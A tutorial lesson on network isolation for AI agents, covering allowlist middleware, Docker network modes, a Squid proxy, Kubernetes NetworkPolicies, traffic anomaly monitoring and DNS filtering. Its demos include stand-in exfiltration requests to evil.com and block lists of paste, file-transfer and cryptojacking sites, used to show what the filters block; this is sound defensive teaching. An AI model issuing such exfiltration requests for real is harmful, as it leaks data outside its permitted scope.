---
title: "Network isolation"
---

# Network isolation

## Introduction

A compromised agent with network access can exfiltrate data, download malware, communicate with command-and-control servers, or attack internal services. Network isolation ensures agents can only reach the specific endpoints they need — and nothing else. We implement this at the application level with allowlists, at the container level with Docker networking, and at the cluster level with Kubernetes NetworkPolicies.

Network isolation is the control that prevents a prompt injection attack from becoming a data breach. Even if an attacker tricks an agent into running malicious code, network isolation ensures that code can't phone home.

### What we'll cover

- Outbound request restrictions with allowlisted domains
- Application-level network middleware for agent HTTP calls
- Docker network isolation modes
- Kubernetes NetworkPolicies for cluster-level control
- Network traffic monitoring and anomaly detection
- DNS-based filtering for agent traffic

### Prerequisites

- HTTP fundamentals (Unit 1, Lesson 06)
- Docker networking basics
- Container sandboxing concepts (Lesson 03)
- Python `urllib` and `httpx` / `requests`

---

## Application-level network control

The first layer of network isolation happens inside your application code. We wrap all outbound HTTP calls in a middleware that enforces an allowlist.

### Domain allowlist middleware

```python
import re
import time
from dataclasses import dataclass, field
from urllib.parse import urlparse
from typing import Any


@dataclass
class NetworkRule:
    """A rule for allowing or blocking network access."""
    domain_pattern: str     # Glob-like pattern: "*.openai.com"
    allowed: bool
    ports: list[int] = field(default_factory=lambda: [443, 80])
    methods: list[str] = field(default_factory=lambda: ["GET", "POST"])
    max_requests_per_minute: int = 60
    reason: str = ""


class NetworkAllowlist:
    """Application-level network access control for agents."""

    def __init__(self, default_deny: bool = True):
        self.default_deny = default_deny
        self.rules: list[NetworkRule] = []
        self.request_log: list[dict] = []
        self._request_counts: dict[str, list[float]] = {}

    def add_rule(self, rule: NetworkRule) -> None:
        self.rules.append(rule)

    def check_request(
        self,
        url: str,
        method: str = "GET",
    ) -> tuple[bool, str]:
        """Check if an outbound request should be allowed."""
        parsed = urlparse(url)
        domain = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)

        # Find matching rules
        for rule in self.rules:
            if self._domain_matches(domain, rule.domain_pattern):
                if not rule.allowed:
                    return False, f"Blocked by rule: {rule.reason or rule.domain_pattern}"

                # Check port
                if port not in rule.ports:
                    return False, f"Port {port} not allowed for {domain}"

                # Check method
                if method.upper() not in rule.methods:
                    return False, f"Method {method} not allowed for {domain}"

                # Check rate limit
                if not self._check_rate(domain, rule.max_requests_per_minute):
                    return False, f"Rate limit exceeded for {domain}"

                self._record_request(domain, url, method, True)
                return True, f"Allowed: matches {rule.domain_pattern}"

        if self.default_deny:
            self._record_request(domain, url, method, False)
            return False, f"No matching rule for {domain} (default deny)"

        return True, "No matching rule (default allow)"

    def _domain_matches(self, domain: str, pattern: str) -> bool:
        """Match domain against a pattern with wildcard support."""
        # Convert glob pattern to regex
        regex = pattern.replace(".", r"\.").replace("*", r"[a-zA-Z0-9.-]*")
        return bool(re.match(f"^{regex}$", domain, re.IGNORECASE))

    def _check_rate(self, domain: str, max_per_minute: int) -> bool:
        """Check if domain is within rate limit."""
        now = time.time()
        if domain not in self._request_counts:
            self._request_counts[domain] = []

        # Clean old entries
        self._request_counts[domain] = [
            t for t in self._request_counts[domain] if now - t < 60
        ]

        if len(self._request_counts[domain]) >= max_per_minute:
            return False

        self._request_counts[domain].append(now)
        return True

    def _record_request(
        self, domain: str, url: str, method: str, allowed: bool
    ) -> None:
        """Log the request for monitoring."""
        self.request_log.append({
            "timestamp": time.time(),
            "domain": domain,
            "url": url[:100],
            "method": method,
            "allowed": allowed,
        })


# Configure allowlist for a research agent
allowlist = NetworkAllowlist(default_deny=True)

# Allow OpenAI API
allowlist.add_rule(NetworkRule(
    domain_pattern="api.openai.com",
    allowed=True,
    ports=[443],
    methods=["POST"],
    max_requests_per_minute=30,
))

# Allow Google Scholar and arXiv
allowlist.add_rule(NetworkRule(
    domain_pattern="scholar.google.com",
    allowed=True,
    ports=[443],
    methods=["GET"],
))
allowlist.add_rule(NetworkRule(
    domain_pattern="arxiv.org",
    allowed=True,
    ports=[443],
    methods=["GET"],
))

# Explicitly block known bad patterns
allowlist.add_rule(NetworkRule(
    domain_pattern="*.pastebin.com",
    allowed=False,
    reason="Data exfiltration risk",
))

# Block all internal network ranges
allowlist.add_rule(NetworkRule(
    domain_pattern="*.internal",
    allowed=False,
    reason="Internal network access blocked",
))

# Test various requests
test_requests = [
    ("https://api.openai.com/v1/chat/completions", "POST"),
    ("https://scholar.google.com/scholar?q=AI+safety", "GET"),
    ("https://arxiv.org/abs/2301.00001", "GET"),
    ("https://evil.pastebin.com/raw/hack", "GET"),
    ("https://internal.service.internal/admin", "GET"),
    ("https://unknown-site.com/data", "GET"),
    ("https://api.openai.com/v1/models", "GET"),  # Wrong method
]

print("=== Network Allowlist Checks ===\n")
for url, method in test_requests:
    allowed, reason = allowlist.check_request(url, method)
    status = "✅" if allowed else "❌"
    domain = urlparse(url).hostname
    print(f"{status} {method:4} {domain:<30} — {reason}")
```

**Output:**
```
=== Network Allowlist Checks ===

✅ POST api.openai.com                 — Allowed: matches api.openai.com
✅ GET  scholar.google.com             — Allowed: matches scholar.google.com
✅ GET  arxiv.org                      — Allowed: matches arxiv.org
❌ GET  evil.pastebin.com              — Blocked by rule: Data exfiltration risk
❌ GET  internal.service.internal      — Blocked by rule: Internal network access blocked
❌ GET  unknown-site.com               — No matching rule for unknown-site.com (default deny)
❌ GET  api.openai.com                 — Method GET not allowed for api.openai.com
```

### Wrapping HTTP clients with the allowlist

We create a wrapper around standard HTTP clients that enforces the allowlist before every request:

```python
from dataclasses import dataclass
from typing import Any


@dataclass
class MockResponse:
    """Simulated HTTP response for demonstration."""
    status_code: int
    text: str
    url: str


class SecureHTTPClient:
    """HTTP client wrapper that enforces network allowlist."""

    def __init__(self, allowlist: NetworkAllowlist, agent_id: str):
        self.allowlist = allowlist
        self.agent_id = agent_id

    async def get(self, url: str, **kwargs) -> MockResponse:
        """Make a GET request through the allowlist."""
        return await self._request("GET", url, **kwargs)

    async def post(self, url: str, **kwargs) -> MockResponse:
        """Make a POST request through the allowlist."""
        return await self._request("POST", url, **kwargs)

    async def _request(self, method: str, url: str, **kwargs) -> MockResponse:
        """Internal request method with allowlist check."""
        allowed, reason = self.allowlist.check_request(url, method)

        if not allowed:
            raise PermissionError(
                f"Network request blocked for agent '{self.agent_id}': "
                f"{method} {url} — {reason}"
            )

        # In production, this would use httpx or aiohttp
        # For demo, return a mock response
        return MockResponse(
            status_code=200,
            text=f"Response from {url}",
            url=url,
        )


# Usage in an agent tool
import asyncio

async def demo_secure_client():
    client = SecureHTTPClient(allowlist, agent_id="research-v1")

    # Allowed request
    try:
        response = await client.post("https://api.openai.com/v1/chat/completions")
        print(f"✅ Success: {response.status_code} from {response.url}")
    except PermissionError as e:
        print(f"❌ Blocked: {e}")

    # Blocked request
    try:
        response = await client.get("https://evil.com/exfiltrate?data=secrets")
        print(f"✅ Success: {response.status_code}")
    except PermissionError as e:
        print(f"❌ Blocked: {e}")

asyncio.run(demo_secure_client())
```

**Output:**
```
✅ Success: 200 from https://api.openai.com/v1/chat/completions
❌ Blocked: Network request blocked for agent 'research-v1': GET https://evil.com/exfiltrate?data=secrets — No matching rule for evil.com (default deny)
```

---

## Docker network isolation

Docker provides network isolation at the container level. For agent sandboxing, we use three modes depending on the security requirement.

### Network modes for agent containers

```python
from dataclasses import dataclass


@dataclass
class DockerNetworkMode:
    """Docker network mode configuration."""
    name: str
    flag: str
    isolation_level: str
    use_case: str
    allows_outbound: bool
    allows_dns: bool


NETWORK_MODES = [
    DockerNetworkMode(
        name="none",
        flag="--network=none",
        isolation_level="Complete",
        use_case="Code execution with no network at all",
        allows_outbound=False,
        allows_dns=False,
    ),
    DockerNetworkMode(
        name="internal",
        flag="--network=agent-internal",
        isolation_level="High",
        use_case="Agent-to-agent communication only (no internet)",
        allows_outbound=False,
        allows_dns=True,  # Internal DNS only
    ),
    DockerNetworkMode(
        name="restricted",
        flag="--network=agent-restricted",
        isolation_level="Medium",
        use_case="Controlled internet access via proxy",
        allows_outbound=True,  # Through proxy only
        allows_dns=True,
    ),
]

print("=== Docker Network Modes for Agents ===\n")
print(f"{'Mode':<12} {'Isolation':<10} {'Outbound':<10} {'DNS':<6} Use Case")
print("-" * 80)
for mode in NETWORK_MODES:
    outbound = "Yes" if mode.allows_outbound else "No"
    dns = "Yes" if mode.allows_dns else "No"
    print(f"{mode.name:<12} {mode.isolation_level:<10} {outbound:<10} {dns:<6} {mode.use_case}")
```

**Output:**
```
=== Docker Network Modes for Agents ===

Mode         Isolation  Outbound   DNS    Use Case
--------------------------------------------------------------------------------
none         Complete   No         No     Code execution with no network at all
internal     High       No         Yes    Agent-to-agent communication only (no internet)
restricted   Medium     Yes        Yes    Controlled internet access via proxy
```

### Creating isolated Docker networks

```bash
# Create an internal network (no internet access)
docker network create \
  --internal \
  --driver bridge \
  agent-internal

# Create a restricted network with specific subnet
docker network create \
  --driver bridge \
  --subnet=172.28.0.0/16 \
  --ip-range=172.28.1.0/24 \
  agent-restricted

# Run an agent container with no network
docker run --rm \
  --network=none \
  --memory=128m \
  --cpus=0.5 \
  python:3.12-slim \
  python -c "
import socket
try:
    socket.create_connection(('google.com', 80), timeout=3)
    print('Connected!')
except Exception as e:
    print(f'Network blocked: {e}')
"
```

**Expected output:**
```
Network blocked: [Errno -3] Temporary failure in name resolution
```

### Using a filtering proxy for controlled access

When agents need some network access, we route traffic through a proxy that enforces the allowlist at the network level:

```python
# Squid proxy configuration for agent traffic
SQUID_CONFIG = """
# /etc/squid/squid.conf for agent proxy

# Only allow HTTPS to specific domains
acl allowed_domains dstdomain .openai.com
acl allowed_domains dstdomain .anthropic.com
acl allowed_domains dstdomain scholar.google.com
acl allowed_domains dstdomain arxiv.org
acl allowed_domains dstdomain .wikipedia.org

# Block everything else
acl agent_network src 172.28.1.0/24

# Allow CONNECT (HTTPS) only to allowed domains
http_access allow agent_network allowed_domains
http_access deny agent_network

# Deny all other access
http_access deny all

# Logging
access_log /var/log/squid/access.log squid
cache_log /var/log/squid/cache.log

# Listen on port 3128
http_port 3128
"""

# Docker Compose setup for proxy + agent
DOCKER_COMPOSE = """
version: '3.8'

services:
  proxy:
    image: ubuntu/squid:latest
    networks:
      - agent-restricted
      - internet    # Proxy has internet access
    volumes:
      - ./squid.conf:/etc/squid/squid.conf:ro
    ports: []       # No ports exposed to host

  agent:
    image: python:3.12-slim
    networks:
      - agent-restricted    # Agent only on restricted network
    environment:
      - HTTP_PROXY=http://proxy:3128
      - HTTPS_PROXY=http://proxy:3128
    depends_on:
      - proxy

networks:
  agent-restricted:
    internal: true    # No direct internet access
  internet:
    driver: bridge    # Proxy bridge to internet
"""

print("=== Proxy-Based Network Control ===\n")
print("Squid Proxy Config (key rules):")
print("-" * 50)
for line in SQUID_CONFIG.strip().split("\n"):
    if line.strip() and not line.strip().startswith("#"):
        print(f"  {line.strip()}")
```

**Output:**
```
=== Proxy-Based Network Control ===

Squid Proxy Config (key rules):
--------------------------------------------------
  acl allowed_domains dstdomain .openai.com
  acl allowed_domains dstdomain .anthropic.com
  acl allowed_domains dstdomain scholar.google.com
  acl allowed_domains dstdomain arxiv.org
  acl allowed_domains dstdomain .wikipedia.org
  acl agent_network src 172.28.1.0/24
  http_access allow agent_network allowed_domains
  http_access deny agent_network
  http_access deny all
  access_log /var/log/squid/access.log squid
  cache_log /var/log/squid/cache.log
  http_port 3128
```

> **🤖 AI Context:** A filtering proxy is the most practical approach for agents that need controlled internet access. The agent container has no direct internet — all traffic goes through the proxy, which enforces domain allowlists. This is much harder to bypass than application-level checks.

---

## Kubernetes NetworkPolicies

In a Kubernetes cluster, NetworkPolicies provide declarative network access control at the pod level. They're additive — if any policy allows a connection, it's permitted.

### Default deny policy

The first step is always to deny all traffic, then selectively allow what's needed:

```yaml
# deny-all.yaml — Block all ingress and egress for agent pods
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: agent-default-deny
  namespace: agents
spec:
  podSelector:
    matchLabels:
      app: agent
  policyTypes:
    - Ingress
    - Egress
```

### Allow specific egress for agents

```yaml
# agent-egress.yaml — Allow agents to reach specific services
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: agent-allow-egress
  namespace: agents
spec:
  podSelector:
    matchLabels:
      app: agent
  policyTypes:
    - Egress
  egress:
    # Allow DNS resolution (required for any domain-based access)
    - to:
        - namespaceSelector: {}
          podSelector:
            matchLabels:
              k8s-app: kube-dns
      ports:
        - protocol: UDP
          port: 53
        - protocol: TCP
          port: 53

    # Allow access to LLM API proxy (internal service)
    - to:
        - podSelector:
            matchLabels:
              app: llm-proxy
      ports:
        - protocol: TCP
          port: 8080

    # Allow access to vector database
    - to:
        - podSelector:
            matchLabels:
              app: vector-db
      ports:
        - protocol: TCP
          port: 6333

    # Block everything else (implicit with default deny)
```

### Agent-specific network policies

```python
# Generate NetworkPolicy YAML for different agent types
import yaml


def generate_network_policy(
    agent_type: str,
    allowed_services: list[dict],
    allow_dns: bool = True,
) -> dict:
    """Generate a Kubernetes NetworkPolicy for an agent type."""
    egress_rules = []

    # DNS is almost always needed
    if allow_dns:
        egress_rules.append({
            "to": [{
                "namespaceSelector": {},
                "podSelector": {"matchLabels": {"k8s-app": "kube-dns"}},
            }],
            "ports": [
                {"protocol": "UDP", "port": 53},
                {"protocol": "TCP", "port": 53},
            ],
        })

    # Add allowed service rules
    for service in allowed_services:
        rule = {
            "to": [{"podSelector": {"matchLabels": {"app": service["name"]}}}],
            "ports": [{"protocol": "TCP", "port": service["port"]}],
        }
        egress_rules.append(rule)

    return {
        "apiVersion": "networking.k8s.io/v1",
        "kind": "NetworkPolicy",
        "metadata": {
            "name": f"{agent_type}-network-policy",
            "namespace": "agents",
        },
        "spec": {
            "podSelector": {
                "matchLabels": {"app": "agent", "agent-type": agent_type},
            },
            "policyTypes": ["Ingress", "Egress"],
            "egress": egress_rules,
        },
    }


# Research agent: can access LLM proxy and search service
research_policy = generate_network_policy(
    "research",
    [
        {"name": "llm-proxy", "port": 8080},
        {"name": "search-service", "port": 8081},
    ],
)

# Coding agent: can access LLM proxy and code runner (no search)
coding_policy = generate_network_policy(
    "coding",
    [
        {"name": "llm-proxy", "port": 8080},
        {"name": "code-runner", "port": 8082},
    ],
)

# Data agent: can access LLM proxy and database only
data_policy = generate_network_policy(
    "data",
    [
        {"name": "llm-proxy", "port": 8080},
        {"name": "vector-db", "port": 6333},
        {"name": "postgres", "port": 5432},
    ],
)

print("=== Generated NetworkPolicies ===\n")
for name, policy in [
    ("Research Agent", research_policy),
    ("Coding Agent", coding_policy),
    ("Data Agent", data_policy),
]:
    allowed = [
        r["to"][0]["podSelector"]["matchLabels"]["app"]
        for r in policy["spec"]["egress"]
        if r["to"][0].get("podSelector", {}).get("matchLabels", {}).get("app")
    ]
    print(f"{name}: can reach {', '.join(allowed)}")

print(f"\nFull YAML for Research Agent policy:")
print(yaml.dump(research_policy, default_flow_style=False))
```

**Output:**
```
=== Generated NetworkPolicies ===

Research Agent: can reach llm-proxy, search-service
Coding Agent: can reach llm-proxy, code-runner
Data Agent: can reach llm-proxy, vector-db, postgres

Full YAML for Research Agent policy:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: research-network-policy
  namespace: agents
spec:
  podSelector:
    matchLabels:
      agent-type: research
      app: agent
  policyTypes:
  - Ingress
  - Egress
  egress:
  - to:
    - namespaceSelector: {}
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - port: 53
      protocol: UDP
    - port: 53
      protocol: TCP
  - to:
    - podSelector:
        matchLabels:
          app: llm-proxy
    ports:
    - port: 8080
      protocol: TCP
  - to:
    - podSelector:
        matchLabels:
          app: search-service
    ports:
    - port: 8081
      protocol: TCP
```

---

## Network traffic monitoring

Even with allowlists, we monitor network traffic for anomalies — unusual volumes, unexpected timing, or data patterns that suggest compromise.

```python
import time
from collections import defaultdict
from dataclasses import dataclass, field


@dataclass
class TrafficStats:
    """Statistics for network traffic from an agent."""
    total_requests: int = 0
    total_bytes_out: int = 0
    total_bytes_in: int = 0
    domains_contacted: set = field(default_factory=set)
    requests_per_domain: dict = field(default_factory=lambda: defaultdict(int))
    errors: int = 0
    start_time: float = field(default_factory=time.time)


class NetworkMonitor:
    """Monitor agent network traffic for anomalies."""

    def __init__(
        self,
        max_requests_per_minute: int = 30,
        max_unique_domains: int = 10,
        max_bytes_out_per_request: int = 1_000_000,  # 1MB
        max_total_bytes_out: int = 50_000_000,        # 50MB
    ):
        self.max_rpm = max_requests_per_minute
        self.max_domains = max_unique_domains
        self.max_bytes_out = max_bytes_out_per_request
        self.max_total_out = max_total_bytes_out
        self.stats = TrafficStats()
        self.alerts: list[dict] = []

    def record_request(
        self,
        domain: str,
        bytes_out: int = 0,
        bytes_in: int = 0,
        status_code: int = 200,
    ) -> list[str]:
        """Record a network request and check for anomalies."""
        self.stats.total_requests += 1
        self.stats.total_bytes_out += bytes_out
        self.stats.total_bytes_in += bytes_in
        self.stats.domains_contacted.add(domain)
        self.stats.requests_per_domain[domain] += 1

        if status_code >= 400:
            self.stats.errors += 1

        # Run anomaly checks
        alerts = []

        # Check: too many unique domains (possible scanning)
        if len(self.stats.domains_contacted) > self.max_domains:
            alerts.append(f"🔍 Domain diversity alert: {len(self.stats.domains_contacted)} unique domains contacted")

        # Check: large outbound payload (possible exfiltration)
        if bytes_out > self.max_bytes_out:
            alerts.append(f"📤 Large outbound: {bytes_out:,} bytes to {domain}")

        # Check: total outbound volume
        if self.stats.total_bytes_out > self.max_total_out:
            alerts.append(f"📊 Total outbound volume: {self.stats.total_bytes_out:,} bytes")

        # Check: request rate
        elapsed = max(time.time() - self.stats.start_time, 1)
        rpm = (self.stats.total_requests / elapsed) * 60
        if rpm > self.max_rpm:
            alerts.append(f"⚡ High request rate: {rpm:.0f} req/min")

        # Check: high error rate
        if self.stats.total_requests > 5:
            error_rate = self.stats.errors / self.stats.total_requests
            if error_rate > 0.3:
                alerts.append(f"⚠️ High error rate: {error_rate:.0%}")

        for alert in alerts:
            self.alerts.append({
                "time": time.time(),
                "domain": domain,
                "alert": alert,
            })

        return alerts

    def report(self) -> str:
        """Generate a traffic report."""
        elapsed = time.time() - self.stats.start_time
        lines = [
            "=== Network Traffic Report ===",
            f"Duration: {elapsed:.1f}s",
            f"Total Requests: {self.stats.total_requests}",
            f"Unique Domains: {len(self.stats.domains_contacted)}",
            f"Total Out: {self.stats.total_bytes_out:,} bytes",
            f"Total In: {self.stats.total_bytes_in:,} bytes",
            f"Errors: {self.stats.errors}",
            "",
            "Top domains:",
        ]
        for domain, count in sorted(
            self.stats.requests_per_domain.items(),
            key=lambda x: x[1],
            reverse=True,
        )[:5]:
            lines.append(f"  {domain}: {count} requests")

        if self.alerts:
            lines.append(f"\n⚠️ Alerts: {len(self.alerts)}")
            for alert in self.alerts[-5:]:
                lines.append(f"  {alert['alert']}")

        return "\n".join(lines)


# Simulate agent traffic
monitor = NetworkMonitor(
    max_requests_per_minute=20,
    max_unique_domains=5,
    max_bytes_out_per_request=100_000,
)

# Normal traffic
normal_requests = [
    ("api.openai.com", 2000, 5000, 200),
    ("api.openai.com", 1500, 8000, 200),
    ("scholar.google.com", 500, 15000, 200),
    ("arxiv.org", 300, 25000, 200),
    ("api.openai.com", 3000, 6000, 200),
]

# Suspicious traffic
suspicious_requests = [
    ("unknown1.com", 500, 100, 404),
    ("unknown2.com", 500, 100, 404),
    ("unknown3.com", 500, 100, 404),
    ("unknown4.com", 150_000, 100, 200),  # Large outbound!
    ("unknown5.com", 500, 100, 404),
    ("unknown6.com", 500, 100, 404),
]

print("=== Normal Agent Traffic ===\n")
for domain, out_bytes, in_bytes, status in normal_requests:
    alerts = monitor.record_request(domain, out_bytes, in_bytes, status)
    if alerts:
        for a in alerts:
            print(f"  ALERT: {a}")

print("(No alerts — normal behavior)\n")

print("=== Suspicious Traffic Begins ===\n")
for domain, out_bytes, in_bytes, status in suspicious_requests:
    alerts = monitor.record_request(domain, out_bytes, in_bytes, status)
    for a in alerts:
        print(f"  ALERT: {a}")

print(f"\n{monitor.report()}")
```

**Output:**
```
=== Normal Agent Traffic ===

(No alerts — normal behavior)

=== Suspicious Traffic Begins ===

  ALERT: 🔍 Domain diversity alert: 6 unique domains contacted
  ALERT: 🔍 Domain diversity alert: 7 unique domains contacted
  ALERT: 🔍 Domain diversity alert: 8 unique domains contacted
  ALERT: 📤 Large outbound: 150,000 bytes to unknown4.com
  ALERT: 🔍 Domain diversity alert: 9 unique domains contacted
  ALERT: ⚠️ High error rate: 36%
  ALERT: 🔍 Domain diversity alert: 10 unique domains contacted
  ALERT: ⚠️ High error rate: 45%
  ALERT: 🔍 Domain diversity alert: 11 unique domains contacted
  ALERT: ⚠️ High error rate: 50%

=== Network Traffic Report ===
Duration: 0.0s
Total Requests: 11
Unique Domains: 11
Total Out: 159,300 bytes
Total In: 59,300 bytes
Errors: 5

Top domains:
  api.openai.com: 3 requests
  scholar.google.com: 1 requests
  arxiv.org: 1 requests
  unknown1.com: 1 requests
  unknown2.com: 1 requests

⚠️ Alerts: 11
  🔍 Domain diversity alert: 10 unique domains contacted
  ⚠️ High error rate: 45%
  🔍 Domain diversity alert: 11 unique domains contacted
  ⚠️ High error rate: 50%
  🔍 Domain diversity alert: 11 unique domains contacted
```

---

## DNS-based filtering

DNS filtering is a lightweight way to block entire categories of domains. We intercept DNS queries and resolve only allowlisted domains.

```python
from dataclasses import dataclass, field


@dataclass
class DNSFilter:
    """DNS-level filtering for agent traffic."""
    allowed_domains: set[str] = field(default_factory=set)
    blocked_categories: set[str] = field(default_factory=set)
    resolve_log: list[dict] = field(default_factory=list)

    # Category-based blocklists (simplified)
    CATEGORY_DOMAINS = {
        "file_sharing": {"pastebin.com", "hastebin.com", "ghostbin.co", "transfer.sh"},
        "vpn_proxy": {"nordvpn.com", "expressvpn.com", "tor2web.org"},
        "crypto": {"coinhive.com", "crypto-loot.com"},
        "social_media": {"twitter.com", "facebook.com", "reddit.com", "instagram.com"},
    }

    def resolve(self, domain: str) -> tuple[bool, str]:
        """Check if DNS resolution should be allowed."""
        # Check explicit allowlist
        for allowed in self.allowed_domains:
            if domain == allowed or domain.endswith(f".{allowed}"):
                self.resolve_log.append({"domain": domain, "allowed": True})
                return True, "Allowlisted"

        # Check blocked categories
        for category in self.blocked_categories:
            blocked_set = self.CATEGORY_DOMAINS.get(category, set())
            base_domain = ".".join(domain.split(".")[-2:])
            if base_domain in blocked_set:
                self.resolve_log.append({"domain": domain, "allowed": False})
                return False, f"Blocked category: {category}"

        # Default deny
        self.resolve_log.append({"domain": domain, "allowed": False})
        return False, "Not in allowlist"


# Configure DNS filter for an agent
dns = DNSFilter(
    allowed_domains={"openai.com", "anthropic.com", "arxiv.org", "google.com"},
    blocked_categories={"file_sharing", "vpn_proxy", "crypto"},
)

test_domains = [
    "api.openai.com",
    "docs.anthropic.com",
    "arxiv.org",
    "scholar.google.com",
    "pastebin.com",           # Blocked (file sharing)
    "nordvpn.com",            # Blocked (VPN)
    "evil-site.com",          # Default deny
    "transfer.sh",            # Blocked (file sharing)
]

print("=== DNS Filter Results ===\n")
for domain in test_domains:
    allowed, reason = dns.resolve(domain)
    status = "✅ RESOLVE" if allowed else "❌ BLOCKED"
    print(f"{status}: {domain:<30} — {reason}")
```

**Output:**
```
=== DNS Filter Results ===

✅ RESOLVE: api.openai.com                 — Allowlisted
✅ RESOLVE: docs.anthropic.com             — Allowlisted
✅ RESOLVE: arxiv.org                      — Allowlisted
✅ RESOLVE: scholar.google.com             — Allowlisted
❌ BLOCKED: pastebin.com                   — Blocked category: file_sharing
❌ BLOCKED: nordvpn.com                    — Blocked category: vpn_proxy
❌ BLOCKED: evil-site.com                  — Not in allowlist
❌ BLOCKED: transfer.sh                    — Blocked category: file_sharing
```

---

## Best practices

| Practice | Why It Matters |
|----------|----------------|
| Default deny for all outbound traffic | Only explicitly allowed connections work — everything else is blocked |
| Use network-level isolation, not just application-level | Application checks can be bypassed; Docker/K8s network isolation can't |
| Route agent traffic through a filtering proxy | Centralized logging, allowlisting, and inspection of all traffic |
| Monitor traffic volume and domain diversity | Unusual patterns reveal compromise early |
| Separate networks for different agent types | Research agents and code execution agents have different network needs |
| Log all blocked requests | Blocked requests reveal attack attempts and misconfigured allowlists |

---

## Common pitfalls

| ❌ Mistake | ✅ Solution |
|-----------|-------------|
| Relying only on application-level URL checks | Add Docker `--network=none` or Kubernetes NetworkPolicy |
| Forgetting to allow DNS in network policies | Pods can't resolve domains without explicit DNS egress rules |
| Using `--network=host` for convenience | Never — this bypasses all container network isolation |
| Allowing wildcard domains (`*.com`) | Be specific: `api.openai.com`, not `*.openai.com` |
| Not monitoring blocked requests | You miss attack attempts and legitimate access needs |
| Same network policy for all agent types | Tailor policies to each agent's actual needs |

---

## Hands-on exercise

### Your task

Build a `NetworkSecurityGateway` class that combines domain allowlisting, rate limiting, traffic monitoring, and request logging into a single middleware for agent HTTP requests.

### Requirements

1. Configure an allowlist with at least 4 domains and their allowed HTTP methods
2. Implement rate limiting at 10 requests per minute per domain
3. Track total bytes sent/received and alert when outbound exceeds 1MB
4. Log every request with timestamp, domain, method, allowed/denied status, and size
5. Generate a summary report at the end

### Expected result

Normal agent traffic passes through cleanly. Requests to unlisted domains, excessive rates, or large outbound transfers trigger alerts and blocks.

<details>
<summary>💡 Hints (click to expand)</summary>

- Combine the `NetworkAllowlist` and `NetworkMonitor` patterns from this lesson
- Use `collections.defaultdict(list)` for per-domain rate tracking
- Store timestamps for rate limiting and clean old entries each check
- The report should show top domains, total traffic, and all alerts

</details>

<details>
<summary>✅ Solution (click to expand)</summary>

```python
import time
from collections import defaultdict
from dataclasses import dataclass, field


@dataclass
class RequestLog:
    timestamp: float
    domain: str
    method: str
    allowed: bool
    reason: str
    bytes_out: int = 0
    bytes_in: int = 0


class NetworkSecurityGateway:
    def __init__(self):
        self.allowed_domains: dict[str, list[str]] = {}
        self.rate_limit = 10  # per minute per domain
        self.max_outbound = 1_000_000
        self.request_times: dict[str, list[float]] = defaultdict(list)
        self.logs: list[RequestLog] = []
        self.total_out = 0
        self.total_in = 0
        self.alerts: list[str] = []

    def allow(self, domain: str, methods: list[str]):
        self.allowed_domains[domain] = [m.upper() for m in methods]

    def request(self, url: str, method: str, bytes_out: int = 0, bytes_in: int = 0) -> bool:
        from urllib.parse import urlparse
        domain = urlparse(url).hostname or ""
        method = method.upper()
        now = time.time()

        # Check allowlist
        if domain not in self.allowed_domains:
            self._log(domain, method, False, "Not in allowlist", bytes_out, bytes_in)
            return False

        if method not in self.allowed_domains[domain]:
            self._log(domain, method, False, f"Method {method} not allowed", bytes_out, bytes_in)
            return False

        # Check rate limit
        self.request_times[domain] = [t for t in self.request_times[domain] if now - t < 60]
        if len(self.request_times[domain]) >= self.rate_limit:
            self._log(domain, method, False, "Rate limit exceeded", bytes_out, bytes_in)
            self.alerts.append(f"Rate limit: {domain}")
            return False

        # Check outbound size
        if self.total_out + bytes_out > self.max_outbound:
            self._log(domain, method, False, "Outbound limit exceeded", bytes_out, bytes_in)
            self.alerts.append(f"Outbound limit: {self.total_out + bytes_out:,} bytes")
            return False

        # Allow
        self.request_times[domain].append(now)
        self.total_out += bytes_out
        self.total_in += bytes_in
        self._log(domain, method, True, "OK", bytes_out, bytes_in)
        return True

    def _log(self, domain, method, allowed, reason, bytes_out, bytes_in):
        self.logs.append(RequestLog(time.time(), domain, method, allowed, reason, bytes_out, bytes_in))

    def report(self):
        allowed = sum(1 for l in self.logs if l.allowed)
        denied = sum(1 for l in self.logs if not l.allowed)
        domains = defaultdict(int)
        for l in self.logs:
            domains[l.domain] += 1

        print(f"Total: {len(self.logs)} | Allowed: {allowed} | Denied: {denied}")
        print(f"Outbound: {self.total_out:,} | Inbound: {self.total_in:,}")
        print(f"Alerts: {len(self.alerts)}")
        for d, c in sorted(domains.items(), key=lambda x: -x[1])[:5]:
            print(f"  {d}: {c} requests")


gw = NetworkSecurityGateway()
gw.allow("api.openai.com", ["POST"])
gw.allow("arxiv.org", ["GET"])
gw.allow("scholar.google.com", ["GET"])
gw.allow("api.anthropic.com", ["POST"])

gw.request("https://api.openai.com/v1/chat", "POST", 2000, 5000)
gw.request("https://arxiv.org/abs/123", "GET", 100, 10000)
gw.request("https://evil.com/steal", "GET", 50000, 0)
gw.request("https://api.openai.com/v1/chat", "GET", 100, 0)  # Wrong method
gw.report()
```
</details>

### Bonus challenges

- [ ] Add IP-based blocking for known malicious IP ranges
- [ ] Implement bandwidth throttling (limit bytes per second per domain)
- [ ] Create a "learning mode" that logs traffic without blocking, then generates an allowlist

---

## Summary

✅ **Application-level allowlists** are the first defense — wrapping HTTP clients to enforce domain/method/rate restrictions before any request leaves your code

✅ **Docker network modes** provide kernel-level isolation — `--network=none` for complete blocking, internal networks for pod-to-pod only, or proxy-based restricted access

✅ **Kubernetes NetworkPolicies** enable declarative, pod-level network rules — always start with default-deny and explicitly allow DNS plus required services

✅ **Traffic monitoring** detects compromise through anomalies — unusual domain diversity, large outbound payloads, or high error rates signal something is wrong

✅ **DNS filtering** blocks entire categories of domains at the resolution layer, preventing access before connections are even attempted

---

**Next:** [Capability-Based Permissions](./05-capability-based-permissions.md)

**Previous:** [Sandboxed Code Execution](./03-sandboxed-code-execution.md)

---

## Further Reading

- [Kubernetes Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/) - Official pod network isolation documentation
- [Docker Networking](https://docs.docker.com/engine/network/) - Container network modes and configuration
- [Squid Proxy Documentation](http://www.squid-cache.org/Doc/) - Filtering proxy setup
- [DNS-based Content Filtering](https://developers.cloudflare.com/1.1.1.1/setup/) - Cloudflare DNS filtering

<!-- 
Sources Consulted:
